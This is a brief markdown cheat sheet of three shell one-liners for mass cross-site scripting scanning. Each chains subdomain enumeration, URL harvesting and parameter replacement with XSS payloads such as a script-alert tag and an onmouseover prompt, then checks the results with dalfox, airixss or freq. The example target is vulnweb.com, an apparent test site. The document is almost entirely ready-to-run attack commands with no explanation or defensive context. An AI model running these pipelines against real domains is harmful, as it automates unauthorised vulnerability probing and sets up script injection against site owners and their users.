# Mass XSS OneLiners
- Dalfox XSS<br>
`subfinder -d vulnweb.com | httpx | katana -ps | gf xss | qsreplace | anew | dalfox pipe --skip-bav`
- AiriXSS Oneline<br>
`echo vulnweb.com | assetfinder --subs-only | httpx --silent | waybackurls | qsreplace '@x.y"><xss onmouSEOver=prompt(1337)>' | airixss -p 'prompt(1337)' | grep -v 'Not'`
- Freq XSS
`echo vulnweb.com | assetfinder --subs-only | httpx --silent | waybackurls | gf xss | qsreplace '"><script>alert(1)</script>' | freq | grep -v 'Not'`
